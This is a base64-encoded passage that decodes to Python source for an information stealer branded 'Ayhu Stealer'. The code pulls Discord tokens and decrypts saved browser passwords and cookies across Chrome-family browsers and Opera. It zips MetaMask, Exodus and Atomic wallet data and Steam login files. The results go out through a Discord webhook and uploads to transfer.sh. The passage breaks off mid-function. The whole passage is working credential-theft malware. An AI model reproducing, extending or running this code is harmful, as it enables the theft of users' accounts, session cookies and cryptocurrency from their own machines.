KICAgICAgICAiYXR0YWNobWVudHMiOiBbXQ0KICAgICAgICB9DQogICAgICAgICMgdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykpDQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQoNCiAgICBpZiAid3Bjb29rIiBpbiBuYW1lOg0KICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIGNvb2tpV29yZHMpDQogICAgICAgIGlmIGxlbihyYikgPiAxMDAwOg0KICAgICAgICAgICAgcnJycnIgPSBSZWZvcm1hdChzdHIoY29va2lXb3JkcykpDQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQ0KDQogICAgICAgIGRhdGEgPSB7DQogICAgICAgICJjb250ZW50IjogJycsDQogICAgICAgICJlbWJlZHMiOiBbDQogICAgICAgICAgICB7DQogICAgICAgICAgICAiY29sb3IiOiAxNDQwNjQxMywNCiAgICAgICAgICAgICJmaWVsZHMiOiBbDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICJuYW1lIjogIkZvdW5kOiIsDQogICAgICAgICAgICAgICAgInZhbHVlIjogcmINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJBeWh1IHwgQ29va2llcyBTdGVhbGVyIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgInRleHQiOiAiQEF5aHUgU3RlYWxlciIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MDAwMzc4NTU1ODY4MzY5OC8xMDMxMTQ3OTE3Njg1MzA5NDkwL3NhLmpwZyINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgICAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KDQogICAgIyByID0gcmVxdWVzdHMucG9zdChob29rLCBmaWxlcz1maWxlcykNCiAgICBMb2FkUmVxdWVzdHMoIlBPU1QiLCBob29rLCBmaWxlcz1maWxlcykNCg0KZGVmIHdyaXRlZm9yZmlsZShkYXRhLCBuYW1lKToNCiAgICBwYXRoID0gb3MuZ2V0ZW52KCJURU1QIikgKyBmIlx3cHtuYW1lfS50eHQiDQogICAgd2l0aCBvcGVuKHBhdGgsIG1vZGU9J3cnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOg0KICAgICAgICBmLndyaXRlKGYiPC0tQVlIVSBTVEVBTEVSIEJFU1QgLS0+XG5cbiIpDQogICAgICAgIGZvciBsaW5lIGluIGRhdGE6DQogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOg0KICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7bGluZX1cbiIpDQoNClRva2VucyA9ICcnDQpkZWYgZ2V0VG9rZW4ocGF0aCwgYXJnKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aCArPSBhcmcNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI1LDExMH0iLCByIm1mYVwuW1x3LV17ODAsOTV9Iik6DQogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW4pOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBUb2tlbnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCkNCg0KUGFzc3cgPSBbXQ0KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIFBhc3N3DQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvTG9naW4gRGF0YSINCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybg0KDQogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiDQoNCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQ0KICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkNCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpDQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQ0KICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pDQoNCiAgICBmb3Igcm93IGluIGRhdGE6DQogICAgICAgIGlmIHJvd1swXSAhPSAnJzoNCiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOg0KICAgICAgICAgICAgICAgIG9sZCA9IHdhDQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToNCiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2ENCiAgICAgICAgICAgICAgICAgICAgd2EgPSB0bXAuc3BsaXQoJ1snKVsxXS5zcGxpdCgnXScpWzBdDQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOg0KICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpDQogICAgICAgICAgICBQYXNzdy5hcHBlbmQoZiJVUjE6IHtyb3dbMF19IHwgVTUzUk40TTM6IHtyb3dbMV19IHwgUDQ1NVcwUkQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQ0KICAgICAgICAjIHByaW50KFtyb3dbMF0sIHJvd1sxXSwgRGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSldKQ0KICAgIHdyaXRlZm9yZmlsZShQYXNzdywgJ3Bhc3N3JykNCg0KQ29va2llcyA9IFtdDQpkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIENvb2tpZXMNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIg0KICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuDQoNCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiINCg0KICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpDQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQ0KICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCg0KICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCg0KICAgIGZvciByb3cgaW4gZGF0YToNCiAgICAgICAgaWYgcm93WzBdICE9ICcnOg0KICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6DQogICAgICAgICAgICAgICAgb2xkID0gd2ENCiAgICAgICAgICAgICAgICBpZiAiaHR0cHMiIGluIHdhOg0KICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQ0KICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0NCiAgICAgICAgICAgICAgICBpZiB3YSBpbiByb3dbMF06DQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczogY29va2lXb3Jkcy5hcHBlbmQob2xkKQ0KICAgICAgICAgICAgQ29va2llcy5hcHBlbmQoZiJIMDU3IEszWToge3Jvd1swXX0gfCBONE0zOiB7cm93WzFdfSB8IFY0MVUzOiB7RGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSl9IikNCiAgICAgICAgIyBwcmludChbcm93WzBdLCByb3dbMV0sIERlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpXSkNCiAgICB3cml0ZWZvcmZpbGUoQ29va2llcywgJ2Nvb2snKQ0KDQpkZWYgR2V0RGlzY29yZChwYXRoLCBhcmcpOg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmIntwYXRofS9Mb2NhbCBTdGF0ZSIpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZw0KDQogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIg0KICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCiAgICAjIHByaW50KHBhdGgsIG1hc3Rlcl9rZXkpDQoNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToNCiAgICAgICAgIyBwcmludChwYXRoLCBmaWxlKQ0KICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGhDfVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHIiZFF3NHc5V2dYY1E6W14uKlxbJyguKiknXF0uKiRdW15cIl0qIiwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMNCiAgICAgICAgICAgICAgICAgICAgdG9rZW5EZWNvZGVkID0gRGVjcnlwdFZhbHVlKGI2NGRlY29kZSh0b2tlbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBtYXN0ZXJfa2V5KQ0KICAgICAgICAgICAgICAgICAgICBpZiBjaGVja1Rva2VuKHRva2VuRGVjb2RlZCk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFRva2VuczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbkRlY29kZWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbG9hZFRva2VuKHRva2VuRGVjb2RlZCwgcGF0aCkNCg0KDQpkZWYgWmlwVGhpbmdzKHBhdGgsIGFyZywgcHJvY2MpOg0KICAgIHBhdGhDID0gcGF0aA0KICAgIG5hbWUgPSBhcmcNCiAgICAjIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIsIHNoZWxsPVRydWUpDQogICAgIyBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIpDQoNCiAgICBpZiAibmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iIGluIGFyZzoNCiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgIG5hbWUgPSBmIk1ldGFtYXNrX3ticm93c2VyfSINCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnDQoNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4NCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQ0KDQogICAgaWYgIldhbGxldCIgaW4gYXJnIG9yICJOYXRpb25zR2xvcnkiIGluIGFyZzoNCiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSINCg0KICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuDQogICAgICAgIGYgPSBvcGVuKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIsICJyKyIsIGVuY29kaW5nPSJ1dGY4IikNCiAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkNCiAgICAgICAgIyBwcmludChkYXRhKQ0KICAgICAgICBmb3VuZCA9IEZhbHNlDQogICAgICAgIGZvciBsIGluIGRhdGE6DQogICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOg0KICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZQ0KICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuDQogICAgICAgIG5hbWUgPSBhcmcNCg0KICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToNCiAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlOiB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpDQogICAgemYuY2xvc2UoKQ0KDQogICAgdXBsb2FkKGYne3BhdGhDfS97bmFtZX0uemlwJykNCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQ0KDQoNCmRlZiBHYXRoZXJBbGwoKToNCiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcNCiAgICBicm93c2VyUGF0aHMgPSBbDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBHWCBTdGFibGUiLCAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBOZW9uL1VzZXIgRGF0YS9EZWZhdWx0IiwgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntsb2NhbH0vVGhvcml1bS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICJ0aG9yaXVtLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgU3hTL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L01pY3Jvc29mdC9FZGdlL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAiZWRnZS5leGUiLCAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdDQogICAgXQ0KDQogICAgZGlzY29yZFBhdGhzID0gWw0KICAgICAgICBbZiJ7cm9hbWluZ30vRGlzY29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgICAgIFtmIntyb2FtaW5nfS9MaWdodGNvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZGNhbmFyeSIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkcHRiIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwNCiAgICBdDQoNCiAgICBQYXRoc1RvWmlwID0gWw0KICAgICAgICBbZiJ7cm9hbWluZ30vYXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICciQXRvbWljIFdhbGxldC5leGUiJywgIldhbGxldCJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1cy53YWxsZXQiLCAiRXhvZHVzLmV4ZSIsICJXYWxsZXQiXSwNCiAgICAgICAgWyJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZyIsICJzdGVhbS5leGUiLCAiU3RlYW0iXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAiTmF0aW9uc0dsb3J5LmV4ZSIsICJOYXRpb25zR2xvcnkiXQ0KICAgIF0NCg0KICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoNCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFRva2VuLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpDQogICAgZm9yIHBhdHQgaW4gZGlzY29yZFBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2V0RGlzY29yZCwgYXJncz1bcGF0dFswXSwgcGF0dFsxXV0pDQogICAgICAgIGEuc3RhcnQoKQ0KICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQ0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0UGFzc3csIGFyZ3M9W3BhdHRbMF0sIHBhdHRbM11dKQ0KICAgICAgICBhLnN0YXJ0KCkNCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkNCg0KICAgIFRoQ29rayA9IFtdDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0Q29va2llLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzRdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIFRoQ29ray5hcHBlbmQoYSkNCg0KICAgIGZvciB0aHJlYWQgaW4gVGhDb2trOiB0aHJlYWQuam9pbigpDQogICAgREVURUNURUQgPSBUcnVzdChDb29raWVzKQ0KICAgIGlmIERFVEVDVEVEID09IFRydWU6IHJldHVybg0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKS5zdGFydCgpDQoNCiAgICBmb3IgcGF0dCBpbiBQYXRoc1RvWmlwOg0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpDQoNCiAgICBmb3IgdGhyZWFkIGluIFRocmVhZGxpc3Q6DQogICAgICAgIHRocmVhZC5qb2luKCkNCiAgICBnbG9iYWwgdXB0aHMNCiAgICB1cHRocyA9IFtdDQoNCiAgICBmb3IgZmlsZSBpbiBbIndwcGFzc3cudHh0IiwgIndwY29vay50eHQiXToNCiAgICAgICAgdXBsb2FkKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpDQoNCmRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToNCiAgICB0cnk6DQogICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0NCiAgICAgICAgLi4uDQogICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpDQogICAgICAgIHVybCA9IHVwbG9hZC50ZXh0DQogICAgICAgIHJldHVybiB1cmwNCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgS2l3aUZvbGRlcihwYXRoRiwga2V5d29yZHMpOg0KICAgIGdsb2JhbCBLaXdpRmlsZXMNCiAgICBtYXhmaWxlc3BlcmRpciA9IDcNCiAgICBpID0gMA0KICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQ0KICAgIGZmb3VuZCA9IFtdDQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToNCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybg0KICAgICAgICBpICs9IDENCiAgICAgICAgaWYgaSA8PSBtYXhmaWxlc3BlcmRpcjoNCiAgICAgICAgICAgIHVybCA9IHVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkNCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZm